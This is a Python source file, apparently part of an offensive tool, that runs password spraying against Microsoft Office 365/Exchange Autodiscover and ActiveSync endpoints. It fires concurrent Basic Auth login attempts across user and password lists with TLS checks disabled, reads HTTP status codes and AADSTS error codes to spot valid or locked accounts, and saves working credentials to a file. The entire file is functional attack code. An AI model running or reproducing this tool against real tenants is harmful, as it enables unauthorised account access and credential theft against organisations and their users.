#!/usr/bin/env python3

import sys
import signal
import urllib3
import aiohttp
import asyncio
from core.utils.config import *
from core.utils.helper import *
from core.utils.taskpool import *
from core.utils.colors import text_colors
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Sprayer:

    valid_creds = {}  # Valid credentials storage
    helper = Helper() # Helper functions

    def __init__(self, userlist, args):
        self.args       = args
        self.task_limit = self.args.limit
        self.userlist   = userlist
        self.config     = autodiscover if not args.secondary else activesync
        if args.secondary:
            headers["MS-ASProtocolVersion"] = "14.0"


    def shutdown(self, key=False):
        # Print new line after ^C
        msg = '\n[*] Writing valid credentials found to file \'%svalid_users\'...' % self.args.output
        if key:
            msg  = '\n[!] CTRL-C caught.' + msg

        print(msg)
        self.helper.write_data(self.valid_creds, "%s/valid_users.txt" % (self.args.output))


    async def run(self, passwords):
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=None, ssl=False)) as session,\
            TaskPool(self.task_limit) as tasks:
            for password in passwords:
                for user in self.userlist:
                    await tasks.put(self.spray(session, user, password))


    async def run_paired(self, passlist):
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=None, ssl=False)) as session,\
            TaskPool(self.task_limit) as tasks:
            for user, password in zip(self.userlist, passlist):
                await tasks.put(self.spray(session, user, password))


    async def spray(self, session, user, password):
        try:

            method = session.get if not self.args.secondary else session.options
            email  = self.helper.check_email(user, self.args.domain)
            async with method(
                self.config["url"],
                auth=aiohttp.BasicAuth(email, password),
                headers=headers,
                proxy=self.args.proxy,
                timeout=self.args.timeout
            ) as response:

                status = response.status

                # Valid credentials
                if status in self.config["status_codes"].keys():

                    ok,msg = (self.config["status_codes"][status], password)

                    if status != 200:
                        msg += " (Manually confirm [2FA, Locked, etc.])"

                    print("[%s%s%s] %s:%s%s" % (text_colors.green, ok, text_colors.reset, email, msg, self.helper.space))

                    self.valid_creds[email] = password
                    self.userlist.remove(user) # Remove valid user from being sprayed again

                # Invalid credentials
                else:

                    err,msg = ("BAD_PASSWD", password)

                    if status not in [401, 404]:
                        msg += " (Unknown Error [%s])" % (status)

                    # Handle Autodiscover errors that are returned by the server
                    if "X-AutoDiscovery-Error" in response.headers.keys():

                        # Handle Basic Auth blocking
                        if any(_str in response.headers["X-AutoDiscovery-Error"] for _str in ["Basic Auth Blocked","BasicAuthBlockStatus - Deny","BlockBasicAuth - User blocked"]):

                            err = "BLOCKED"
                            msg = " Basic Auth blocked for this user. Removing from spray rotation.\n"
                            self.userlist.remove(user)

                        else:

                            # Handle AADSTS errors - remove user from future rotations
                            for code in self.config["AADSTS_codes"].keys():

                                if code in response.headers["X-AutoDiscovery-Error"]:

                                    err = self.config["AADSTS_codes"][code][0]
                                    msg = " %s. Removing from spray rotation.\n" % (self.config["AADSTS_codes"][code][1])
                                    self.userlist.remove(user)

                                    break

                    print("[%s%s%s] %s:%s%s" % (text_colors.red, err, text_colors.reset, email, msg, self.helper.space), end='\r')

                await response.text()

        except Exception as e:
            if self.args.debug: print("\n[ERROR] %s" % e)
            pass